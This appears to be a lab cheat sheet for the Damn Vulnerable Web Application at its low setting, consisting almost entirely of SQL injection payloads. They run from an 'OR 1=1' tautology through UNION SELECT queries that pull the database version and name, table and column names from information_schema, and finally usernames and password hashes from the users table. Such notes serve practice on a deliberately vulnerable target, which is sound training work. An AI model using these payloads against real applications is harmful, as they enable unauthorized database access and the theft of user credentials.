# DVWA LOW

```
1' OR 1=1#
1' OR 1=1 UNION SELECT 1, VERSION()#
1' OR 1=1 UNION SELECT 1,DATABASE() #

#Check which database is used
1' OR 1=1 UNION SELECT VERSION(),DATABASE() #

#Check table of database
1' OR 1=1 UNION SELECT null,  table_name FROM  information_schema.tables #
1' OR 1=1 UNION SELECT null,  table_name FROM  information_schema.tables WHERE table_type='base table' AND table_schema='dvwa' #
%' and 1=0 union select null, table_name from information_schema.tables #

#Show all columns from the table users
1' OR 1=1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' #

#Select specified column from the table users
1' OR 1=1 UNION SELECT user, password FROM users #
```
